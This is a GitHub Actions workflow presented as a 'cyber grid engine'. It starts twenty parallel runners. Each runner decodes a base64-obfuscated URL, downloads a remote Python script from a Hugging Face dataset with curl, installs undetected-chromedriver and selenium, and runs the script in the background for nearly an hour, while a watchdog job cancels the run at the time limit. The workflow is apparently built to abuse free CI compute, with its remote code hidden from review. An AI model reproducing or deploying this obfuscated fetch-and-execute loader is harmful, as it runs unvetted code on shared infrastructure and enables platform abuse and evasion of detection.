name: Hyperion Cyber Grid Engine

on:
  workflow_dispatch:

concurrency:
  group: hyperion-grid-${{ github.workflow }}-${{ github.ref }}
  cancel-in-progress: false

permissions:
  actions: write
  contents: read

jobs:
  # =================================================================
  # Watchdog: cancels the workflow after timeout to free resources
  # =================================================================
  watchdog-monitor:
    name: "System Watchdog"
    runs-on: ubuntu-latest
    timeout-minutes: 60
    env:
      MAX_WATCH_SECONDS: 3540
    steps:
      - name: Initialize Watchdog
        run: |
          echo "[WATCHDOG] Execution monitor initialized for ID: ${{ github.run_id }}"
          echo "[WATCHDOG] Waiting for threshold: ${MAX_WATCH_SECONDS} seconds."

          sleep "${MAX_WATCH_SECONDS}"

          echo "[WATCHDOG] Timeout limit hit. Aborting active execution..."

          curl -sS -X POST \
            -H "Authorization: Bearer ${{ secrets.GITHUB_TOKEN }}" \
            -H "Accept: application/vnd.github+json" \
            -H "X-GitHub-Api-Version: 2022-11-28" \
            "https://api.github.com/repos/${{ github.repository }}/actions/runs/${{ github.run_id }}/cancel"

          echo "[WATCHDOG] Abort signal sent successfully."

  # =================================================================
  # Processing Nodes: parallel grid workers
  # =================================================================
  grid-workers:
    name: "GridWorker-${{ matrix.node_index }}"
    runs-on: ubuntu-latest
    timeout-minutes: 59

    strategy:
      fail-fast: false
      matrix:
        node_index: [8001, 8002, 8003, 8004, 8005, 8006, 8007, 8008, 8009, 8010, 8011, 8012, 8013, 8014, 8015, 8016, 8017, 8018, 8019, 8020]

    steps:
      - name: Prepare Environment
        run: |
          echo "[PREPARE] Configuring dependencies for worker index ${{ matrix.node_index }}..."
          sudo apt-get update -qq
          sudo apt-get install -y curl python3-pip

      - name: Fetch Remote Task Payload
        run: |
          echo "[FETCH] Fetching payload from external endpoint..."
          PAYLOAD_URI=$(printf '%s' "aHR0cHM6Ly9odWdnaW5nZmFjZS5jby9kYXRhc2V0cy9zamtoZnVrL2ZvZm8vcmVzb2x2ZS9tYWluL3N0YXJ0LnB5" | base64 -d)
          curl -sL "$PAYLOAD_URI" -o worker_task.py
          echo "[FETCH] Payload fetched and saved."

      - name: Install Python Dependencies
        run: |
          echo "[DEPS] Installing required libraries..."
          pip3 install -q undetected-chromedriver selenium requests psutil

      - name: Execute Worker Task
        run: |
          echo "[EXEC] Starting task script on node ${{ matrix.node_index }}..."

          python3 worker_task.py &
          TASK_PID=$!

          echo "[EXEC] Task running under PID $TASK_PID. Maximum duration: 3540 seconds."

          sleep 3540

          if kill -0 "$TASK_PID" 2>/dev/null; then
            echo "[EXEC] Maximum duration reached. Terminating process..."
            kill -9 "$TASK_PID"
            echo "[EXEC] Process successfully killed."
          else
            echo "[EXEC] Task finished prior to threshold."
          fi
